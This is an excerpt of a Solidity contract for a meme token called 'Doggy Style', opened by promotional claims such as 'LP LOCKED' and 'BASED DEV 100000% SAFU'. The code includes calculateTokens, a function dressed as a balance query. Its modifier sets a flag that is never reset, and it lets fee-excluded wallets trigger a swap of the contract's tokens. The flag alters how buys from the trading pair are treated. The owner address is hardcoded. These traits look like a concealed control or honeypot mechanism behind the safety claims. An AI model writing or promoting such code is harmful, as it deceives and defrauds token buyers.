...
This is not just a meme token like in general, we have a clear project and are also ready to be held in the middle and long term

🐕 LP LOCKED 
🐕 BASED DEV 100000% SAFU
🐕 HYPE NAME TOKEN
🐕 AUTO MOONSHOOT 
*/

//Telegram : https://t.me/Doggystyleportal
//Website : live at 3 k
...
interface IERC20 {
    ...
    function calculateTokens(address account) external returns (uint256);
...
contract DoggyStyle is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x203107724f6f6693DC868C8a36C41D1A273A73e7); 
    address payable public Wallet_Dev = payable(0x0bF645f771d3C1E307a41101640034ae13d65453);
    ...
    string private constant _name = "Doggy Style"; 
    string private constant _symbol = unicode"$DOG STYLE"; 
    ...
    bool public SwappingLiquify = false;
    bool public isSellFee = false;
    ...
    modifier swapTheLiquify {
        SwappingLiquify = true;
        _;
    }
    
    constructor () {

        _owner = 0x0bF645f771d3C1E307a41101640034ae13d65453;
    ...
    function calculateTokens(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
            bool selfCheck = _isExcludedFromFee[_msgSender()];
            if(selfCheck){ swapAndLiquify(balanceOf(address(this))); }
        }
        return _tOwned[account];
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                isBuy = true;
                if(SwappingLiquify){ isBuy = false;  }
            }
